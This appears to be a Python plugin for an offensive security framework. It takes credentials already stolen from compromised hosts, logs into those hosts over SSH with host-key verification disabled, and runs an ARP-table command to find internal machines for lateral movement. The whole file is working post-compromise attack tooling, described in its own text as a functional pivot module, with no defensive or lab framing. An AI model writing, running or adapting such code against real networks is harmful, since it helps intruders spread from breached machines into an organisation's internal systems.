import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class LateralPivoterPlugin(BasePlugin):
    def __init__(self):
        # Common internal network ranges to probe
        self.internal_ranges = ["192.168.1.0/24", "10.0.0.0/24", "172.16.0.0/24"]

    @property
    def name(self):
        return "LateralPivoter"

    @property
    def description(self):
        return "Functional pivot module that uses compromised hosts to discover and scan internal networks."

    async def probe_internal_network(self, conn):
        # We simulate internal discovery by looking at arp cache and active interfaces
        cmd = "ip neigh show | awk '{print $1}'"
        res = await conn.run(cmd)
        if res.stdout:
            ips = [ip.strip() for ip in res.stdout.strip().split('\n') if '.' in ip]
            return list(set(ips))
        return []

    async def run(self, target, data):
        compromised_hosts = data.get('compromised_hosts', {})
        if not compromised_hosts:
            return

        print(f"[*] Starting LateralPivoter internal discovery...")
        lateral_paths = {}

        for ip, creds in compromised_hosts.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    print(f"[*] Pivoting through {ip} to discover internal nodes...")
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            # Discover internal IPs via ARP and Routing
                            discovered_ips = await self.probe_internal_network(conn)
                            if discovered_ips:
                                print(f"    [!!!] DISCOVERED {len(discovered_ips)} internal nodes via {ip}")
                                lateral_paths[ip] = discovered_ips
                        break
                    except Exception as e:
                        print(f"[!] Pivot failed for {ip}: {e}")

        data['lateral_movement_paths'] = lateral_paths
